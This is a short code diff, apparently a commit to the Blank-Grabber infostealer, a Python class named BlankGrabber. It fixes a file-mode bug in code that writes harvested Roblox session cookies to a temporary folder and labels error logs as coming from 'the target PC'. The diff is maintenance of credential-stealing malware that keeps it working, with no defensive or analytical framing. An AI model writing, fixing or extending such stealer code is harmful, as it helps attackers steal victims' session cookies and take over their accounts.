@@ -133,7 +133,7 @@ class BlankGrabber:
             with open(self.tempfolder + "/Roblox Cookies.txt", 'w') as file:
                 file.write("\n\n".join(self.roblocookie))
         if os.path.isfile(self.tempfolder+"/Logs.txt"):
-            with open(self.tempfolder+"/Logs.txt", 'rw') as e:
+            with open(self.tempfolder+"/Logs.txt", 'r+') as e:
                 log = e.read()
                 e.seek(0)
                 e.write("These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+log.strip())
